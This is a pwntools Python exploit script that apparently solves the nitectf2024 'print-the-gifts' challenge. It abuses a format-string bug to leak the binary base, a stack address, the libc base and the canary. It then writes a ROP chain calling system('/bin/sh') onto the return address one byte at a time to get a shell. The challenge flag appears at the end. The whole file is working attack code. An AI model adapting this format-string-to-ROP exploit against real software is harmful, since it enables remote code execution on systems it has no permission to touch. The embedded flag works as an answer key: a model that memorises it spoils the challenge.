#!/usr/bin/env python3

from pwn import *

elf = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = elf
context.terminal = ['tmux', 'splitw', '-hp', '70']
#context.log_level = "debug"
gs = '''
b main+260
continue
'''
def start():
    if args.REMOTE:
        return remote("print-the-gifts.chals.nitectf2024.live", 1337, ssl=True)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript=gs)
    else:
        return process([elf.path])

r = start()

def logbase(): log.info("libc base = %#x" % libc.address)
def logleak(name, val):  log.info(name+" = %#x" % val)
def sa(delim,data): return r.sendafter(delim,data)
def sla(delim,line): return r.sendlineafter(delim,line)
def sl(line): return r.sendline(line)
def rcu(d1, d2=0):
  r.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return r.recvuntil(d2,drop=True)

#========= exploit here ===================
#1 stack
#21 canary
#25 base
payload = b"%25$p"
sla(b"from santa", payload)
binleak = int(rcu(b"you a ", b"\n"),16)
logleak("bin leak", binleak)
binbase = binleak - 0x1199
logleak("Bin base", binbase)
sla(b"Enter y or n",b"y")


payload = b"%1$p"
sla(b"from santa", payload)
stackleak = int(rcu(b"you a ", b"\n"),16)
logleak("stack leak", stackleak)
sla(b"Enter y or n",b"y")


payload = b"%23$p"
sla(b"from santa", payload)
libcleak = int(rcu(b"you a ", b"\n"),16)
logleak("libc leak", stackleak)
libc.address = libcleak-0x2724a
logbase()
sla(b"Enter y or n",b"y")

payload = b"%21$p"
sla(b"from santa", payload)
canary = int(rcu(b"you a ", b"\n"),16)
logleak("canary", canary)

retbin = stackleak + 0x21a8
logleak("retbin", retbin)
sla(b"Enter y or n",b"y")


gadget = p64(0xdeadbeef)
poprdi = p64(libc.address+0x00000000000277e5) #poprdi
binsh = p64(next(libc.search(b"/bin/sh")))
system = p64(libc.sym.system)
ret = p64(libc.address+0x0000000000026e99)
popr12 = p64(libc.address+0x0000000000027469)


#doesn matter it will be zero out
for i in range(8):
    payload = fmtstr_payload(8, {(retbin+8)+i:int(gadget[i])}, write_size='byte')
    sla(b"from santa", payload)
    sla(b"Enter y or n",b"y")


for i in range(8):
    payload = fmtstr_payload(8, {(retbin+16)+i:int(poprdi[i])}, write_size='byte')
    sla(b"from santa", payload)
    sla(b"Enter y or n",b"y")


for i in range(8):
    payload = fmtstr_payload(8, {(retbin+24)+i:int(binsh[i])}, write_size='byte')
    sla(b"from santa", payload)
    sla(b"Enter y or n",b"y")


for i in range(8):
    payload = fmtstr_payload(8, {(retbin+32)+i:int(ret[i])}, write_size='byte')
    sla(b"from santa", payload)
    sla(b"Enter y or n",b"y")


for i in range(8):
    payload = fmtstr_payload(8, {(retbin+40)+i:int(system[i])}, write_size='byte')
    sla(b"from santa", payload)
    sla(b"Enter y or n",b"y")

#executes to "eat the zeo"
for i in range(8):
    payload = fmtstr_payload(8, {retbin+i:int(popr12[i])}, write_size='byte')
    sla(b"from santa", payload)
    sla(b"Enter y or n",b"y")

sla(b"from santa", b"A")
sla(b"Enter y or n",b"n")


#========= interactive ====================
r.interactive()
#nite{0nLy_n4ugHty_k1d5_Use_%n}